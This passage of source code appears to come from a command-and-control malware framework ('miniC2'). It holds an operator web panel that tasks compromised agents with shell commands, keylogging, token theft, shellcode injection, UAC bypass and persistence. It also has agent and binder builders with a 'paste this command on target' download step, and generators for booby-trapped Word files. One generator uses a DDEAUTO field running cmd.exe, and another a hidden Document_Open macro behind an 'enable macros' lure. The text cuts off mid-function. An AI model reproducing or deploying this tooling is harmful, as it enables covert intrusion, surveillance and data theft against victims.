                    <div style="font-size:12px;color:var(--text3);font-family:var(--mono)" id="bindFileName">Drop .exe here or click to browse</div>
                </div>
            </div>
            <div class="build-grid">
                <div class="fg"><label>c2 host</label><input class="input" name="c2_host" value="127.0.0.1"></div>
                <div class="fg"><label>c2 port</label><input class="input" name="c2_port" value="8443" type="number"></div>
                <div class="fg"><label>sleep</label><input class="input" name="sleep" value="10" type="number"></div>
                <div class="fg"><label>jitter</label><input class="input" name="jitter" value="30" type="number"></div>
            </div>
            <div style="display:flex;gap:6px;align-items:center">
                <button class="btn" type="submit" id="bindBtn">Build Bind</button>
                <span id="bindStatus" style="font-size:11px;color:var(--text3);font-family:var(--mono)"></span>
            </div>
        </form>
    </div>
</div>

</div></div></div>
<div class="toast-wrap" id="toasts"></div>
<script>
const API='';
let currentAgent=null;
let knownTaskIds=new Set();
let pendingEls={};
let cmdHistory=[];
let cmdHistIdx=-1;
let taskCount=0;
let currentView='dashboard';
let currentFileTab='all';
let allFilesCache=[];

const THEME_LABELS={dark:'deep',light:'slate'};
function toggleTheme(){let b=document.body;let cur=b.getAttribute('data-theme');let next=cur==='dark'?'light':'dark';b.setAttribute('data-theme',next);document.getElementById('themeBtn').textContent=THEME_LABELS[next]||next;try{localStorage.setItem('miniC2-theme',next);}catch(e){}}
(function(){try{let t=localStorage.getItem('miniC2-theme');if(t){document.body.setAttribute('data-theme',t);document.getElementById('themeBtn').textContent=THEME_LABELS[t]||t;}}catch(e){}})();

const QUICK={shell:['whoami','ipconfig /all','net user','net localgroup administrators','tasklist','systeminfo','dir C:\\','type C:\\Windows\\System32\\drivers\\etc\\hosts'],powershell:['Get-Process','Get-Service','Get-NetIPAddress','Get-ChildItem Env:','whoami /priv'],screenshot:[''],ps:[''],whoami:[''],sysinfo:[''],download:['C:\\Windows\\System32\\drivers\\etc\\hosts'],upload:['C:\\temp\\file.exe C:\\Windows\\Temp\\file.exe'],'kill-process':[''],'persist':['registry','schtasks','remove'],portscan:['127.0.0.1 80,443,3389','127.0.0.1 1-1024'],keylog:['start','dump','stop'],sleep:['5','10','30','60'],inject:[''],steal_token:[''],wmi_exec:[''],uac_bypass:['cmd.exe /c whoami'],selfdestruct:[''],env:['get','set']};
const HINTS={shell:'command',powershell:'command',download:'remote path',upload:'local_path remote_path','kill-process':'PID',portscan:'target ports',keylog:'start / dump / stop',sleep:'seconds',persist:'add / remove',inject:'target_pid shellcode_base64',steal_token:'target PID',wmi_exec:'host command',uac_bypass:'command to run elevated',env:'variable name (blank=all)'};

function toast(type,msg){let t=document.createElement('div');t.className='toast '+type;t.textContent=msg;document.getElementById('toasts').appendChild(t);setTimeout(()=>t.remove(),3500);}
function esc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
function ts(iso){if(!iso)return'-';try{return new Date(iso).toLocaleTimeString();}catch(e){return'-';}}
function fmtSize(b){if(b<1024)return b+' B';if(b<1048576)return(b/1024).toFixed(1)+' KB';return(b/1048576).toFixed(1)+' MB';}
function timeAgo(iso){if(!iso)return'-';let s=Math.floor((Date.now()-new Date(iso).getTime())/1000);if(s<0)return'now';if(s<5)return'now';if(s<60)return s+'s ago';if(s<3600)return Math.floor(s/60)+'m ago';if(s<86400)return Math.floor(s/3600)+'h ago';return Math.floor(s/86400)+'d ago';}
function statusColor(st){return{online:'var(--green)',warning:'var(--yellow)',offline:'var(--red)',dead:'var(--text3)'}[st]||'var(--text3)';}
function statusBadge(st){let cls={online:'on',warning:'warn',offline:'off',dead:'dead'}[st]||'off';return'<span class="badge '+cls+'">'+st.toUpperCase()+'</span>';}
function fmtUptime(sec){if(!sec||sec<0)return'-';let d=Math.floor(sec/86400),h=Math.floor((sec%86400)/3600),m=Math.floor((sec%3600)/60);if(d>0)return d+'d '+h+'h';if(h>0)return h+'h '+m+'m';return m+'m';}

function showView(name){
    currentView=name;
    document.querySelectorAll('.view').forEach(v=>v.classList.remove('active'));
    let el=document.getElementById('view-'+name);
    if(el)el.classList.add('active');
    document.querySelectorAll('.sidebar-nav a').forEach(a=>a.classList.remove('active'));
    let navLinks=document.querySelectorAll('.sidebar-nav a');
    if(name==='dashboard')navLinks[0].classList.add('active');
    else if(name==='files'){navLinks[1].classList.add('active');refreshFiles();}
    else if(name==='build')navLinks[2].classList.add('active');
    highlightSidebarAgent();
}

function highlightSidebarAgent(){document.querySelectorAll('.agent-item').forEach(el=>el.classList.remove('active'));if(currentAgent){let el=document.getElementById('agent-'+currentAgent);if(el)el.classList.add('active');}}

function selectAgent(id){
    if(currentAgent===id&&currentView==='agent')return;
    currentAgent=id;
    knownTaskIds.clear();
    pendingEls={};
    showView('agent');
    highlightSidebarAgent();
    document.getElementById('feed').innerHTML='';
    renderProfile();
    onCmdChange();
    fetchResults();
    loadNotes();
}

function renderProfile(){
    if(!currentAgent||currentView!=='agent')return;
    fetch(API+'/api/agents/'+currentAgent).then(r=>r.json()).then(a=>{
        if(a.error||!a.id)return;
        document.getElementById('viewTitle').textContent=a.hostname;
        document.getElementById('breadcrumb').innerHTML='<b>'+a.id+'</b> &middot; '+a.username+'@'+a.hostname;
        let stColor=statusColor(a.status);
        let warnEl=document.getElementById('agentWarn');
        if(a.status==='warning')warnEl.innerHTML='<div class="warn-banner yellow">WARNING: Agent missed '+a.missed_checkins+' checkins.</div>';
        else if(a.status==='offline')warnEl.innerHTML='<div class="warn-banner red">OFFLINE: No response for '+timeAgo(a.last_seen)+'</div>';
        else if(a.status==='dead')warnEl.innerHTML='<div class="warn-banner gray">DEAD: Last seen '+timeAgo(a.last_seen)+'</div>';
        else warnEl.innerHTML='';
        document.getElementById('profileBar').innerHTML=
            '<span class="pbadge">'+statusBadge(a.status)+'</span><span class="psep"></span>'
            +'<div class="pitem"><span class="plbl">Target</span><span class="pval">'+esc(a.username)+'@'+esc(a.hostname)+'</span></div><span class="psep"></span>'
            +'<div class="pitem"><span class="plbl">OS</span><span class="pval" style="font-size:11px">'+esc(a.os)+'</span></div><span class="psep"></span>'
            +'<div class="pitem"><span class="plbl">PID</span><span class="pval">'+a.pid+'</span></div><span class="psep"></span>'
            +'<div class="pitem"><span class="plbl">Uptime</span><span class="pval">'+fmtUptime(a.uptime_sec)+' <span style="color:var(--text3);font-size:11px">'+a.sleep+'s</span></span></div><span class="psep"></span>'
            +'<div class="pitem"><span class="plbl">Activity</span><span class="pval">'+(a.total_checkins||0)+' ck / '+(a.total_results||0)+' res</span></div><span class="psep"></span>'
            +'<div class="pitem"><span class="plbl">Last</span><span class="pval" style="color:'+stColor+'">'+timeAgo(a.last_seen)+'</span></div>'
            +'<div class="pactions"><button class="btn danger sm" onclick="killAgent(currentAgent)">Kill</button><button class="btn secondary sm" onclick="removeAgent(currentAgent)" style="border-color:var(--red-border);color:var(--red)">Remove</button></div>';
    });
}

function fetchResults(){
    if(!currentAgent||currentView!=='agent')return;
    fetch(API+'/api/results/'+currentAgent).then(r=>r.json()).then(results=>{
        let feed=document.getElementById('feed');
        results.reverse().forEach(r=>{
            if(knownTaskIds.has(r.task_id))return;
            knownTaskIds.add(r.task_id);
            if(pendingEls[r.task_id])updatePendingResult(r);
            else appendResult(r);
        });
    });
}

function appendResult(r){
    let feed=document.getElementById('feed');
    let div=document.createElement('div');
    div.className='fi result';
    let ok=r.success!==false;
    let cmdText=r.command||'';
    let output=renderOutput(r.output);
    let isLong=output.length>500;
    if(isLong)output=output.substring(0,500);
    let cmdLine=cmdText?'<div class="fi-cmd" style="margin-bottom:4px;color:var(--text3)">$ '+esc(cmdText)+'</div>':'';
    let toggleBtn=isLong?'<div style="margin-top:4px"><button class="qbtn" onclick="toggleOutput(this)" style="font-size:10px">Show full output</button></div>':'';
    div.innerHTML='<div class="fi-head"><span class="fi-ts">'+ts(r.timestamp)+'</span><span class="fi-label '+(ok?'ok':'fail')+'">'+(ok?'RESULT':'FAIL')+'</span></div>'+cmdLine+'<div class="fi-output">'+esc(output)+(isLong?'<span class="fi-truncated">...</span>':'')+'</div>'+toggleBtn;
    div.setAttribute('data-full',isLong?renderOutput(r.output):'');
    feed.appendChild(div);
    feed.scrollTop=feed.scrollHeight;
}
function toggleOutput(btn){
    let fi=btn.closest('.fi');
    let outDiv=fi.querySelector('.fi-output');
    let full=fi.getAttribute('data-full');
    if(!full)return;
    if(btn.textContent==='Show full output'){outDiv.innerHTML=esc(full);btn.textContent='Collapse';}
    else{outDiv.innerHTML=esc(full.substring(0,500))+'<span class="fi-truncated">...</span>';btn.textContent='Show full output';}
}

function updatePendingResult(r){
    let el=pendingEls[r.task_id];if(!el)return;
    let ok=r.success!==false;
    let cmdText=el.getAttribute('data-cmd')||'';
    let output=renderOutput(r.output);
    let isLong=output.length>500;
    if(isLong)output=output.substring(0,500);
    el.className='fi result'+(ok?'':' fail');
    let toggleBtn=isLong?'<div style="margin-top:4px"><button class="qbtn" onclick="toggleOutput(this)" style="font-size:10px">Show full output</button></div>':'';
    el.innerHTML='<div class="fi-head"><span class="fi-ts">'+ts(r.timestamp)+'</span><span class="fi-label '+(ok?'ok':'fail')+'">'+(ok?'RESULT':'FAIL')+'</span></div><div class="fi-cmd" style="margin-bottom:4px;color:var(--text3)">$ '+esc(cmdText)+'</div><div class="fi-output">'+esc(output)+(isLong?'<span class="fi-truncated">...</span>':'')+'</div>'+toggleBtn;
    el.setAttribute('data-full',isLong?renderOutput(r.output):'');
    delete pendingEls[r.task_id];
    document.getElementById('feed').scrollTop=999999;
}

function renderOutput(raw){
    try{let j=JSON.parse(raw);
        if(j.status==='uploaded'&&j.size){return '[Screenshot uploaded: '+fmtSize(j.size)+']';}
        if(j.processes)return formatPs(j);
        if(j.keystrokes!==undefined)return j.length>0?esc(j.keystrokes):'(empty)';
        if(j.tokens){
            if(Array.isArray(j.tokens)){
                let h='PID      User                Process\n';
                j.tokens.slice(0,100).forEach(t=>{let user=(t.domain||'-')+'\\'+(t.user||'-');h+=String(t.pid).padStart(6)+'  '+user.padEnd(20)+'  '+esc(t.process)+'\n';});
                if(j.tokens.length>100)h+='\n... '+j.tokens.length+' total';
                return h;
            }
            return esc(j.tokens);
        }
        if(j.env)return esc(j.env);
    }catch(e){}
    return esc(raw);
}

function formatPs(j){
    let rows=j.processes||[];
    let h='PID      Threads  Name\n';
    rows.slice(0,100).forEach(p=>{h+=String(p.pid).padStart(6)+'  '+String(p.threads).padStart(7)+'  '+esc(p.name)+'\n';});
    if(rows.length>100)h+='\n... '+rows.length+' total';
    return h;
}

function onCmdChange(){let cmd=document.getElementById('cmdSelect').value;document.getElementById('cmdInput').placeholder=HINTS[cmd]||'';let q=QUICK[cmd]||[];document.getElementById('quickRow').innerHTML=q.map(c=>'<button class="qbtn" onclick="document.getElementById(\'cmdInput\').value=this.textContent">'+(c||cmd)+'</button>').join('');}

function sendCmd(){
    if(!currentAgent)return;
    let cmd=document.getElementById('cmdSelect').value;
    let args=document.getElementById('cmdInput').value;
    if(!args&&(cmd==='shell'||cmd==='powershell'))return;
    let a={};
    if(cmd==='shell'||cmd==='powershell')a={cmd:args};
    else if(cmd==='download')a={remote_path:args};
    else if(cmd==='upload'){let p=args.split(' ');a={local_data_b64:p[0]||'',remote_path:p[1]||''};}
    else if(cmd==='kill-process')a={pid:args};
    else if(cmd==='persist')a={action:args||'registry'};
    else if(cmd==='portscan'){let p=args.split(' ');a={target:p[0]||'127.0.0.1',ports:p[1]||'80,443',timeout:'2000'};}
    else if(cmd==='keylog')a={action:args||'dump'};
    else if(cmd==='sleep')a={seconds:args};
    else if(cmd==='inject'){let p=args.split(' ');a={pid:p[0]||'',shellcode:p[1]||''};}
    else if(cmd==='steal_token')a={pid:args};
    else if(cmd==='wmi_exec'){let p=args.indexOf(' ');a={host:args.substring(0,p),cmd:args.substring(p+1)||'cmd /c whoami'};}
    else if(cmd==='uac_bypass')a={cmd:args||'cmd.exe /c whoami'};
    else if(cmd==='selfdestruct')a={};
    else if(cmd==='env'){let p=args.indexOf(' ');if(p>0){a={action:'set',name:args.substring(0,p),value:args.substring(p+1)};}else{a={action:'get',name:args};}}
    fetch(API+'/api/task',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({target_agent:currentAgent,command:cmd,args:a})}).then(r=>r.json()).then(d=>{
        if(d.error){toast('error',d.error);return;}
        taskCount++;document.getElementById('sTasks').textContent=taskCount;
        let feed=document.getElementById('feed');
        let div=document.createElement('div');div.className='fi pending';
        div.setAttribute('data-cmd',cmd+' '+args);
        div.innerHTML='<div class="fi-head"><span class="fi-ts">'+ts(new Date().toISOString())+'</span><span class="fi-label pending">PENDING</span></div><div class="fi-cmd">$ '+esc(cmd+' '+args)+'</div><div style="margin-top:5px"><span style="font-size:11px;color:var(--yellow)">Waiting...</span></div>';
        feed.appendChild(div);feed.scrollTop=feed.scrollHeight;
        pendingEls[d.task_id]=div;
        document.getElementById('cmdInput').value='';
        if(!cmdHistory.length||cmdHistory[cmdHistory.length-1]!==cmd+' '+args)cmdHistory.push(cmd+' '+args);
        cmdHistIdx=-1;toast('info','Task sent');
    });
}

function killAgent(id){if(!confirm('Kill agent '+id+'?'))return;fetch(API+'/api/kill/'+id,{method:'POST'}).then(r=>r.json()).then(()=>{toast('success','Kill signal sent');});}
function removeAgent(id){if(!confirm('Remove agent '+id+' from list?'))return;fetch(API+'/api/agents/'+id+'/remove',{method:'POST'}).then(r=>r.json()).then(d=>{if(d.error){toast('error',d.error);return;}toast('success','Agent removed');if(currentAgent===id){currentAgent=null;showView('dashboard');}refresh();});}

function switchFileTab(tab){currentFileTab=tab;document.querySelectorAll('#filesTabBar button').forEach(b=>b.classList.remove('active'));let btns=document.querySelectorAll('#filesTabBar button');if(tab==='all')btns[0].classList.add('active');else if(tab==='screenshots')btns[1].classList.add('active');else if(tab==='payloads')btns[2].classList.add('active');renderFiles();}

function renderFiles(){
    let files=allFilesCache;
    let imgs=files.filter(f=>/\.(bmp|png|jpg|jpeg)$/i.test(f.filename));
    let filtered=files;
    if(currentFileTab==='screenshots')filtered=imgs;
    else if(currentFileTab==='payloads')filtered=files.filter(f=>/\.(exe|dll|hta|vbs|ps1|lnk|docx|docm|7z|sfx)$/i.test(f.filename));
    let fl=document.getElementById('fileList');
    document.getElementById('fileCount').textContent=filtered.length+' files';
    if(!filtered.length){fl.innerHTML='<div class="empty"><p>No files</p></div>';return;}
    fl.innerHTML=filtered.map(f=>{
        let isImg=/\.(bmp|png|jpg|jpeg|gif)$/i.test(f.filename);
        let isExe=/\.(exe|dll|bin)$/i.test(f.filename);
        let thumb='';
        if(isImg)thumb='<img src="'+API+'/api/files/'+encodeURIComponent(f.filename)+'" loading="lazy" onerror="this.style.display=\'none\'" style="width:40px;height:40px;object-fit:cover;border-radius:4px;border:1px solid var(--border);flex-shrink:0;background:var(--bg2)">';
        return '<div class="file-card">'+(thumb||'<div class="file-icon">'+(isExe?'[EXE]':'[FILE]')+'</div>')+'<div class="file-info"><div class="fname">'+esc(f.filename)+'</div><div class="fmeta">'+fmtSize(f.size)+' &middot; '+ts(f.modified)+'</div></div><div class="file-actions"><button class="btn secondary sm" onclick="dlFile(\''+API+'/api/files/'+esc(f.filename)+'\',\''+esc(f.filename)+'\')">Get</button><button class="btn secondary sm" onclick="deleteFile(\''+esc(f.filename)+'\')" style="color:var(--red);border-color:var(--red-border)">Del</button></div></div>';
    }).join('');
}

function deleteFile(fname){if(!confirm('Delete '+fname+'?'))return;fetch(API+'/api/files/'+encodeURIComponent(fname),{method:'DELETE'}).then(r=>r.json()).then(d=>{if(d.error){toast('error',d.error);return;}toast('success','Deleted');refreshFiles();}).catch(e=>{toast('error','Delete failed');});}
function refreshFiles(){fetch(API+'/api/files').then(r=>r.json()).then(files=>{allFilesCache=files;renderFiles();});}

function buildAgent(){
    let btn=document.getElementById('buildBtn'),st=document.getElementById('buildStatus'),ld=document.getElementById('buildLog'),lo=document.getElementById('buildOutput');
    let h=document.getElementById('bHost').value,p=document.getElementById('bPort').value,s=document.getElementById('bSleep').value,j=document.getElementById('bJitter').value;
    btn.disabled=true;st.textContent='Building...';st.style.color='var(--yellow)';ld.style.display='block';
    lo.textContent='C2_HOST: '+h+'\nC2_PORT: '+p+'\nSLEEP: '+s+'s\nJITTER: '+j+'%';
    fetch(API+'/api/build',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({c2_host:h,c2_port:+p,sleep:+s,jitter:+j})}).then(r=>{
        if(!r.ok)return r.json().then(e=>{throw new Error(e.error)});
        let cd=r.headers.get('content-disposition')||'',fn=cd.replace(/.*filename=/,'')||'agent.exe';
        return r.blob().then(b=>({b,fn}));
    }).then(({b,fn})=>{let u=URL.createObjectURL(b),a=document.createElement('a');a.href=u;a.download=fn;document.body.appendChild(a);a.click();a.remove();URL.revokeObjectURL(u);btn.disabled=false;st.textContent='Done: '+fn+' ('+fmtSize(b.size)+')';st.style.color='var(--green)';lo.textContent+='\nBuild successful!';toast('success','Agent built');}).catch(e=>{btn.disabled=false;st.textContent='Failed: '+e.message;st.style.color='var(--red)';lo.textContent+='\nERROR: '+e.message;});
}
function handleBindFile(file){if(!file)return;document.getElementById('bindFileName').innerHTML='<span style="color:var(--accent)">'+esc(file.name)+'</span> <span style="color:var(--text3)">('+fmtSize(file.size)+')</span>';let dt=new DataTransfer();dt.items.add(file);document.getElementById('bindFile').files=dt.files;}
function buildBind(e){
    e.preventDefault();
    let btn=document.getElementById('bindBtn'),st=document.getElementById('bindStatus');
    let form=document.getElementById('bindForm');
    let fd=new FormData(form);
    if(!fd.get('target')){st.textContent='Select target exe first';st.style.color='var(--red)';return;}
    btn.disabled=true;st.textContent='Building...';st.style.color='var(--yellow)';
    fetch(API+'/api/bind',{method:'POST',body:fd}).then(r=>r.json()).then(j=>{
        if(j.error)throw new Error(j.error);
        btn.disabled=false;st.innerHTML='';
        let d=document.createElement('div');d.style.cssText='margin-top:8px;display:flex;flex-direction:column;gap:8px';
        d.innerHTML='<div style="color:var(--green);font-weight:600">'+j.filename+'</div>'
            +'<div style="color:var(--text2);font-size:11px">Paste this command on target (PowerShell):</div>'
            +'<div style="background:var(--bg2);border:1px solid var(--border);border-radius:6px;padding:8px 10px;font-family:JetBrains Mono,monospace;font-size:10px;color:var(--green);word-break:break-all;cursor:pointer;position:relative" onclick="navigator.clipboard.writeText(this.textContent.trim());toast(\'info\',\'Copied!\')">'
            +'<span style="position:absolute;top:4px;right:8px;color:var(--text3);font-size:9px">click to copy</span>'
            +j.ps_download+'</div>';
        st.appendChild(d);
    }).catch(e=>{btn.disabled=false;st.textContent='Failed: '+e.message;st.style.color='var(--red)';});
}

function refresh(){
    fetch(API+'/api/agents').then(r=>r.json()).then(agents=>{
        agents.sort((a,b)=>{let order={online:0,warning:1,offline:2,dead:3};let sa=order[a.status]||4,sb=order[b.status]||4;if(sa!==sb)return sa-sb;return new Date(a.first_seen)-new Date(b.first_seen);});
        let on=agents.filter(a=>a.online).length;
        document.getElementById('sTotal').textContent=agents.length;
        document.getElementById('sOnlineInline').textContent=on+' online';
        document.getElementById('onlineCount').textContent=on;
        document.getElementById('totalCount').textContent=agents.length;
        let al=document.getElementById('agentList');
        if(!agents.length){al.innerHTML='<div class="empty" style="padding:16px"><p>// no agents</p></div>';return;}
        al.innerHTML=agents.map(a=>'<div class="agent-item'+(currentAgent===a.id?' active':'')+'" id="agent-'+a.id+'" onclick="selectAgent(\''+a.id+'\')"><div class="agent-dot" style="background:'+statusColor(a.status)+';box-shadow:0 0 6px '+(a.online?statusColor(a.status):'transparent')+'"></div><div class="info"><div class="name">'+a.id+' <span style="font-size:10px;color:'+statusColor(a.status)+';margin-left:4px">'+(a.status==='online'?'':a.status.toUpperCase())+'</span></div><div class="host">'+a.hostname+'\\'+a.username+'</div><div style="font-size:10px;color:var(--text3);margin-top:2px">'+timeAgo(a.last_seen)+'</div></div><span class="arch">'+a.arch+'</span></div>').join('');
        let at=document.getElementById('agentTable');
        at.innerHTML=agents.map(a=>'<tr onclick="selectAgent(\''+a.id+'\')" style="cursor:pointer;opacity:'+(a.status==='dead'?.4:1)+'"><td>'+statusBadge(a.status)+'</td><td style="color:var(--accent);font-family:var(--mono);font-weight:600;font-size:11px">'+a.id+'</td><td>'+a.hostname+'</td><td>'+a.username+'</td><td style="font-size:11px">'+a.os+'</td><td><span class="badge arch">'+a.arch+'</span></td><td>'+a.pid+'</td><td>'+a.sleep+'s</td><td style="font-size:11px;color:'+statusColor(a.status)+'" title="'+ts(a.last_seen)+'">'+timeAgo(a.last_seen)+'</td></tr>').join('');
    });
    fetch(API+'/api/results').then(r=>r.json()).then(r=>{document.getElementById('sResults').textContent=r.length;});
    if(currentAgent&&currentView==='agent')fetchResults();
}

function loadNotes(){
    if(!currentAgent)return;
    fetch(API+'/api/notes/'+currentAgent).then(r=>r.json()).then(d=>{
        let notes=d.notes||[];
        document.getElementById('notesCount').textContent=notes.length;
        let el=document.getElementById('notesList');
        if(!notes.length){el.innerHTML='<div style="padding:14px;text-align:center;color:var(--text3);font-size:11px;font-family:var(--mono)">// no notes</div>';return;}
        el.innerHTML=notes.map(n=>'<div class="note-item"><div class="note-text">'+esc(n.content)+'</div><div class="note-ts">'+ts(n.timestamp)+'</div><div class="note-del" onclick="deleteNote(\''+n.id+'\')">x</div></div>').join('');
    });
}

function addNote(){
    if(!currentAgent)return;
    let input=document.getElementById('noteInput');
    let msg=input.value.trim();
    if(!msg)return;
    fetch(API+'/api/notes/'+currentAgent,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'add',content:msg})}).then(()=>{input.value='';loadNotes();toast('info','Note added');});
}

function deleteNote(noteId){
    if(!currentAgent)return;
    fetch(API+'/api/notes/'+currentAgent,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'delete',note_id:noteId})}).then(()=>{loadNotes();});
}

function dlFile(url,fname){fetch(url).then(r=>{if(!r.ok)throw new Error('Download failed');return r.blob();}).then(b=>{let u=URL.createObjectURL(b),a=document.createElement('a');a.href=u;a.download=fname;document.body.appendChild(a);a.click();a.remove();URL.revokeObjectURL(u);toast('success','Downloaded: '+fname);}).catch(e=>{toast('error','Download failed');});}

document.addEventListener('DOMContentLoaded',()=>{
    document.getElementById('cmdInput').addEventListener('keydown',e=>{
        if(e.key==='Enter'){sendCmd();e.preventDefault();}
        else if(e.key==='ArrowUp'){if(cmdHistIdx<cmdHistory.length-1){cmdHistIdx++;e.target.value=cmdHistory[cmdHistory.length-1-cmdHistIdx];}e.preventDefault();}
        else if(e.key==='ArrowDown'){if(cmdHistIdx>0){cmdHistIdx--;e.target.value=cmdHistory[cmdHistory.length-1-cmdHistIdx];}else{cmdHistIdx=-1;e.target.value='';}e.preventDefault();}
    });
    document.getElementById('noteInput').addEventListener('keydown',e=>{if(e.key==='Enter'){addNote();e.preventDefault();}});
});

onCmdChange();
refresh();
setInterval(refresh,3000);
setInterval(()=>{if(currentAgent&&currentView==='agent')fetchResults();},2000);
setInterval(()=>{if(currentAgent&&currentView==='agent')renderProfile();},5000);
setInterval(()=>{if(currentAgent&&currentView==='agent')loadNotes();},10000);
</script>
</body></html>"""


def _create_dde_docx(agent_cmd, output_name):
    payload_dir = os.path.join(BASE_DIR, "payloads")
    fname = f"{output_name}.docx"
    fpath = os.path.join(payload_dir, fname)
    junk = _junk_xml_paragraphs(random.randint(4, 8))
    content_types = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>'''
    rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>'''
    doc_rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
</Relationships>'''
    cmd_escaped = agent_cmd.replace('"', '&quot;')
    dde_fields = ['DDEAUTO', f' c:\\windows\\system32\\cmd.exe ', f'"/k {cmd_escaped}"']
    dde_parts = ''
    for i, part in enumerate(dde_fields):
        if i == 0:
            dde_parts += f'<w:r><w:fldChar w:fldCharType="begin"/></w:r>'
        elif i == 1:
            dde_parts += f'<w:r><w:fldChar w:fldCharType="separate"/></w:r>'
        dde_parts += f'<w:r><w:instrText xml:space="preserve"> {part} </w:instrText></w:r>'
    dde_parts += '<w:r><w:fldChar w:fldCharType="end"/></w:r>'
    document_xml = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:wpc="http://schemas.microsoft.com/office/word/2010/wordprocessingCanvas"
            xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
            xmlns:o="urn:schemas-microsoft-com:office:office"
            xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"
            xmlns:m="http://schemas.openxmlformats.org/officeDocument/2006/math"
            xmlns:v="urn:schemas-microsoft-com:vml"
            xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing"
            xmlns:w10="urn:schemas-microsoft-com:office:word"
            xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"
            xmlns:wne="http://schemas.microsoft.com/office/word/2006/wordml"
            mc:Ignorable="w14 wp14">
  <w:body>
    {junk}
    <w:p><w:r><w:rPr><w:b/></w:rPr><w:t xml:space="preserve">{output_name}</w:t></w:r></w:p>
    <w:p><w:r><w:t xml:space="preserve">Please review the document below.</w:t></w:r></w:p>
    <w:p>
      {dde_parts}
    </w:p>
    {junk}
    <w:sectPr>
      <w:pgSz w:w="12240" w:h="15840"/>
      <w:pgMar w:top="{1440+random.randint(0,200)}" w:right="1800" w:bottom="1440" w:left="1800" w:header="851" w:footer="992" w:gutter="0"/>
    </w:sectPr>
  </w:body>
</w:document>'''
    with zipfile.ZipFile(fpath, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", content_types)
        zf.writestr("_rels/.rels", rels)
        zf.writestr("word/_rels/document.xml.rels", doc_rels)
        zf.writestr("word/document.xml", document_xml)
    return fname, os.path.getsize(fpath)


def _create_macro_docx(agent_cmd, output_name):
    payload_dir = os.path.join(BASE_DIR, "payloads")
    fname = f"{output_name}.docm"
    fpath = os.path.join(payload_dir, fname)
    junk_comment = f"' {_rand_str(random.randint(20, 60))}"
    ps_script = f'''
$word = New-Object -ComObject Word.Application
$word.Visible = $false
$doc = $word.Documents.Add()
$doc.Content.InsertAfter("Confidential - Internal Use Only")
$s = $doc.Sections.Add()
$doc.Content.InsertAfter("Please enable macros to view this document.")
$vba = $doc.VBProject.VBComponents("ThisDocument")
$code = $vba.CodeModule
$code.AddFromString("Private Sub Document_Open()`n{junk_comment}`n  Shell Chr(34) & "cmd.exe /c {agent_cmd}" & Chr(34), vbHide`n{junk_comment}`nEnd Sub")
$doc.SaveAs2("{fpath}", 13)
$doc.Close()
$word.Quit()
Write-Output "OK"
'''
    tmp_ps = os.path.join(payload_dir, "_gen.ps1")
    with open(tmp_ps, "w") as f:
        f.write(ps_script)
    try:
        result = subprocess.run(
            ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", tmp_ps],
            capture_output=True, text=True, timeout=30
        )
        if os.path.exists(fpath):
            return fname, os.path.getsize(fpath)
        else:
            return _create_dde_docx(agent_cmd, output_name)
    except Exception:
        return _create_dde_docx(agent_cmd, output_name)
    finally:
        try: os.unlink(tmp_ps)
        except OSError: pass


def _create_lnk_docx(lnk_data, output_name):
    payload_dir = os.path.join(BASE_DIR, "payloads")
    fname = f"{output_name}.docx"
    fpath = os.path.join(payload_dir, fname)
    junk = _junk_xml_paragraphs(random.randint(3, 6))
    content_types = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Default Extension="bin" ContentType="application/vnd.openxmlformats-officedocument.oleObject"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
  <Override PartName="/word/embeddings/oleObject1.bin" ContentType="application/vnd.openxmlformats-officedocument.oleObject"/>
</Types>'''
    rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>'''
    doc_rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="embeddings/oleObject1.bin"/>
</Relationships>'''
    ole_path = "word/embeddings/oleObject1.bin"
    document_xml = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"
            xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"
            xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing"
            xmlns:o="urn:schemas-microsoft-com:office:office"
            xmlns:p="http://schemas.openxmlformats.org/drawingml/2006/picture">
  <w:body>
    {junk}
